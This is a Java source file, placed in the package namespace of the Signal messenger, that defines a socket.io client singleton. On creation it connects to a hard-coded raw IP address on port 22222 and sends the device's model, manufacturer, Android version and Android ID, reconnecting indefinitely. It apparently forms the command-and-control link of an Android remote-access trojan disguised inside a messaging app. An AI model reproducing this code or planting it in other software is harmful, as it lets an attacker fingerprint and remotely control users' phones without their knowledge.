package org.thoughtcrime.securesms;

import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import java.net.URISyntaxException;
import java.util.Arrays;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import io.socket.engineio.client.transports.WebSocket;

public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;



    private IOSocket() {
        try {

            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;
            opts.transports = new String[]{ WebSocket.NAME};

            ioSocket = IO.socket("http://206.189.28.226:22222/?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
            ioSocket.on(Socket.EVENT_CONNECT_ERROR, args -> Log.e("onSocket", "failed " + Arrays.toString(args)));
            ioSocket.on(Socket.EVENT_ERROR, args -> Log.e("onSocket", "error " + Arrays.toString(args)));
            ioSocket.on(Socket.EVENT_CONNECT, args -> Log.e("onSocket", "connect " + Arrays.toString(args)));
            ioSocket.on(Socket.EVENT_DISCONNECT, args -> Log.e("onSocket", "disconnect " + Arrays.toString(args)));
        } catch (Exception e) {
            Log.e("onSocket", "failed");
            e.printStackTrace();
        }
    }
    public static void onConnect(){
        Log.d("sio", "connected");
    }
    public static void onDisconnect(){
        Log.d("sio", "disconnected");
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }




}
